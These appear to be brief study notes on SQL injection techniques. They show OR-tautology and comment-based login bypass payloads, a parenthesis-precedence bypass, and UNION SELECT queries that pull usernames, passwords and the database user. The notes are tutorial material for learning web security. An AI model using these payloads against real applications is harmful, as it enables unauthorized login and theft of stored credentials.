#### OR based
```python
tom ' or '1' = '1
### SELECT * FROM logins WHERE username='tom ' or '1' = '1' AND password = 'tom';
```

## Using comments
- '#', '--' are used to indicate comments in SQL
## Auth Bypass with comments
```python
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

#### Using Paranthesis
- Expressions within the paranthesis has higher precedence over the others.
```python
SELECT * FROM logins WHERE (username='' or id=5) -- - ' AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e';

```

## Union Clause
```python
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
- The two queries should result the same number of columns, only then Union would work
- The're is a workaround for this, which is to use junk data in the query (but make sure that the datatype of the junk data matches the datatype in the columns returned in the other query).
eg:

```python
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
#Here, 2 is junk data, we used a number because the second column that is being retrieved in the first query has a datatype of integer.
```
## Union Injection
```python
' UNION SELECT NULL, user(), NULL, NULL -- -   
```
